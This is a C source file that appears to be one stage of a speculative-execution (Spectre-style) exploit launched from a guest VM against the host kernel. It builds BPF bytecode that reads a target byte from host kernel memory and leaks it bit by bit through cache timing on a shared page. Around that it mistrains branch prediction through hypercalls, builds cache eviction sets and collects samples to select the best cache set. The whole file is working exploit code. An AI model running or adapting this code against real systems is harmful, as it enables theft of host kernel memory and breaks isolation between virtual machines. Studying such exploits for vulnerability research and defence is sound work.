#include "common.h"
#include <linux/filter.h>
#include <linux/bpf.h>

unsigned long shm_page_host_kernel_virt_addr;
struct page *shm_page;

struct cacheset_count {
  unsigned int set_id;
  int count;
};

/* inverted result for descending sort */
int compare_cacheset_counts(const void *a_, const void *b_) {
  const struct cacheset_count *a = a_;
  const struct cacheset_count *b = b_;
  if (a->count < b->count)
    return 1;
  else if (a->count > b->count)
    return -1;
  else
    return 0;
}

struct cacheline *eviction_sets[SETS_PER_IN_PAGE_OFFSET+5] = {NULL};
struct cacheset_count counts[SETS_PER_IN_PAGE_OFFSET+5];

// bit_idx in 0..7; 0 means leak byte&1, 1 means leak byte&2, 2 means leak byte&4.
// leaks to shm_page[0x800] or shm_page[0xc00].
void try_leak_bit(unsigned long target_byte_addr, int bit_idx) {
  unsigned long host_timing_leak_addr = shm_page_host_kernel_virt_addr;
  struct bpf_insn evil_bytecode_instrs[] = {
    // rax = target_byte_addr
    { .code = BPF_LD | BPF_IMM | BPF_DW, .dst_reg = 0, .imm = target_byte_addr }, { .imm = target_byte_addr>>32 },
    // rdi = timing_leak_array
    { .code = BPF_LD | BPF_IMM | BPF_DW, .dst_reg = 1, .imm = host_timing_leak_addr }, { .imm = host_timing_leak_addr>>32 },
    // rax = *(u8*)rax
    { .code = BPF_LDX | BPF_MEM | BPF_B, .dst_reg = 0, .src_reg = 0, .off = 0 },
    // rax = rax ^ (0x00 or 0xff)
    { .code = BPF_ALU64 | BPF_XOR | BPF_K, .dst_reg = 0, .imm = /*invert*/0x00 },
    // rax = rax << ...
    { .code = BPF_ALU64 | BPF_LSH | BPF_K, .dst_reg = 0, .imm = 10 - bit_idx },
    // rax = rax & 0x400
    { .code = BPF_ALU64 | BPF_AND | BPF_K, .dst_reg = 0, .imm = 0x400 },
    // rax = rdi + rax
    { .code = BPF_ALU64 | BPF_ADD | BPF_X, .dst_reg = 0, .src_reg = 1 },
    // *rax = 0x42
    //{ .code = BPF_ST | BPF_MEM | BPF_B, .dst_reg = 0, .off = 0/*x800*/, .imm = 0x42 },
    { .code = BPF_LDX | BPF_MEM | BPF_B, .dst_reg = 0, .src_reg = 0, .off = 0x800 },
    // clear rdi (rdi = rdi & 0)
    { .code = BPF_ALU64 | BPF_AND | BPF_K, .dst_reg = 1, .imm = 0 },
    // end
    { .code = BPF_JMP | BPF_EXIT }
  };

  long bad_iterations = 0;
  //time_t rt1 = time(NULL);
retry:;
  memcpy(shm_page->data + 128, evil_bytecode_instrs, sizeof(evil_bytecode_instrs));
  shm_page->data[0x800] = 1;
  shm_page->data[0xc00] = 1;

  clflush(shm_page->data + 0x800);
  clflush(shm_page->data + 0xc00);

  static int cur_set_id = 0;
  cur_set_id++;
  if (eviction_sets[cur_set_id] == NULL) cur_set_id = 1;
  do_flushing_and_time(eviction_sets[cur_set_id], NULL);

  train_mispredict_and_hypercall(shm_page_host_kernel_virt_addr - 0xb0, shm_page_host_kernel_virt_addr + 128, RSI_CONTROLLED_CALL_ADDRESS);
  bool bit_is_0 = is_hot(shm_page->data + 0x800);
  bool bit_is_1 = is_hot(shm_page->data + 0xc00);
  if (bit_is_1 != bit_is_0) {
    counts[cur_set_id].set_id = cur_set_id;
    counts[cur_set_id].count++;
    return;
  } else {
    bad_iterations++;
    goto retry;
  }
}

int main(void) {
  printf("%s === starting select_set ===\n", cur_time());
  common_init();
  hot_cold_init();

  struct cacheline *cachelines = map_cachelines();

  for (unsigned int set_id = 1; 1; set_id++) {
    int set_size = get_lines_with_set_id_cm(eviction_sets+set_id, cachelines, set_id, EVICTION_SET_SIZE);
    if (set_size == 0) {
      eviction_sets[set_id] = NULL;
      break;
    }
  }

  shm_page = get_shared_page();
  shm_page_host_kernel_virt_addr = page_offset + shm_page->phys_addr + __builtin_offsetof(struct page, data);
  printf("%s host-virtual kernel address for shared page: 0x%lx\n", cur_time(), shm_page_host_kernel_virt_addr);

  unsigned long target_data_address = PAGE_OFFSET_BASE_ADDRESS;

  ((unsigned long *)(shm_page->data))[0] = BPF_PROG_RUN_ADDRESS;

  for (int i=0; i<200; i++) {
    printf("\r%s collecting samples (%d/200)...", cur_time(), i);
    try_leak_bit(target_data_address, 0);
  }
  printf("\n");

  qsort(counts, sizeof(counts)/sizeof(counts[0]), sizeof(counts[0]), compare_cacheset_counts);
  printf("%s top result: set_id=%u, count=%d\n", cur_time(), counts[0].set_id, counts[0].count);
  printf("%s second result: set_id=%u, count=%d\n", cur_time(), counts[1].set_id, counts[1].count);

  write_ulong_to_file("selected_set", counts[0].set_id);
}
